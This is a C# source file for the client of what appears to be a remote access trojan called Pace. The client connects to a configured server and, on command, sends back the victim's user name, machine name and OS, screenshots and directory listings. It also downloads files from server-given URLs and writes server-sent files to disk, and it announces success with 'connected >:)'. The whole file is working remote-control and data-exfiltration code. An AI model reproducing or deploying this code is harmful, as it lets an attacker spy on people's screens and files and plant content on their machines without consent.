using Pace.Client.Configuration;
using Pace.Client.System;
using Pace.Client.Web;
using Pace.Common.Network;
using Pace.Common.Network.Packets;
using Pace.Common.Network.Packets.Client;
using Pace.Common.Network.Packets.Server;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Pace.Client
{
    class Program
    {
        private PaceClient client;
        private bool isRunning;

        static void Main(string[] args) => new Program().Run();

        private void Run()
        {
            client = new PaceClient();

            Console.Write("Waiting for Server");

            while (!client.TcpClient.Connected)
            {
                try
                {
                    client.Connect(IPAddress.Parse(ClientConfiguration.Host), ClientConfiguration.Port);
                }
                catch (Exception)
                {
                    Console.Write('.');
                    continue;
                }
            }

            Console.Write("connected >:)");

            var packetChannel = new PacketChannel();

            packetChannel.RegisterHandler<GetSystemInfoRequestPacket>((packet) =>
            {
                var systemInfo = SystemInformation.Get();

                var infoPacket = new GetSystemInfoResponsePacket(
                    ClientConfiguration.Identifier,
                    systemInfo.UserName,
                    systemInfo.ComputerName,
                    systemInfo.OperatingSystem
                );

                client.SendPacket(infoPacket);
            });

            packetChannel.RegisterHandler<DownloadFileRequestPacket>((packet) =>
            {
                var downloadFilePacket = (DownloadFileRequestPacket)packet;
                new WebFileDownloader().DownloadFile(downloadFilePacket.Url);
            });

            packetChannel.RegisterHandler<TakeScreenshotRequestPacket>((packet) =>
            {
                var screenshot = ScreenCapture.CaptureScreen();

                byte[] screenshotBytes = ScreenCapture.ImageToBytes(screenshot);

                var screenshotResponsePacket = new TakeScreenshotResponsePacket(screenshotBytes);

                client.SendPacket(screenshotResponsePacket);
            });

            packetChannel.RegisterHandler<SendFileRequestPacket>((packet) =>
            {
                var sendFilePacket = (SendFileRequestPacket)packet;
                File.WriteAllBytes(Path.Combine(Environment.CurrentDirectory, sendFilePacket.Filename), sendFilePacket.FileData);
            });

            packetChannel.RegisterHandler<GetDirectoryRequestPacket>((packet) =>
            {
                var getDirectoryPacket = (GetDirectoryRequestPacket)packet;

                var response = new GetDirectoryResponsePacket
                {
                    Folders = FileExplorer.GetDirectories(getDirectoryPacket.Path),
                    Files = FileExplorer.GetFiles(getDirectoryPacket.Path)
                };

                client.SendPacket(response);
            });

            isRunning = true;

            while (isRunning)
            {
                try
                {
                    var packet = client.ReadPacket();

                    packetChannel.HandlePacket(packet);
                }
                catch (IOException ex)
                {
                    if (ex.InnerException == null)
                    {
                        throw ex;
                    }

                    if (ex.InnerException.GetType() == typeof(SocketException))
                    {
                        var socketException = (ex.InnerException as SocketException);

                        if (socketException.ErrorCode == (int)SocketError.ConnectionReset)
                        {
                            Console.WriteLine("Connection reset!");
                        }
                    }

                    isRunning = false;
                }
            }

            Console.ReadKey();
        }
    }
}